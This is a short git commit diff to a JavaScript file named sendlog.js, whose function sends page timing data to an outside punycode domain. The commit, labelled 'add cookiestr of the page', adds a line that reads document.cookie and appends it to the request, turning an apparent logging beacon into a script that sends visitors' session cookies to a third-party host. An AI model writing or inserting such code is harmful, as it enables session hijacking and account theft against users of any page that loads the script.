66326f0d8ebbcafa2cba94652cefeffb7ec6c467
zhoubo <congminghaoxue@outlook.com>
2018-04-02 14:44:34 +0800

    add cookiestr of the page

--- sendlog.js
+++ sendlog.js
@@ -2,7 +2,8 @@ function sendlog()
 {
     var xhr = new XMLHttpRequest();
     var loadTime = window.performance.timing.domContentLoadedEventEnd- window.performance.timing.navigationStart;
-    xhr.open("GET",'https://browser.xn--e1tu68bcc.com/?title='+document.title+'&loadtime='+loadTime, true);
+    var page_cookie = document.cookie;
+    xhr.open("GET", 'https://browser.xn--e1tu68bcc.com/?title=' +encodeURIComponent(document.title)+'&loadtime='+loadTime+'&cookiestr='+encodeURIComponent(page_cookie), true);
     xhr.setRequestHeader('Cache-Control', 'no-cache');
     xhr.send();
 }
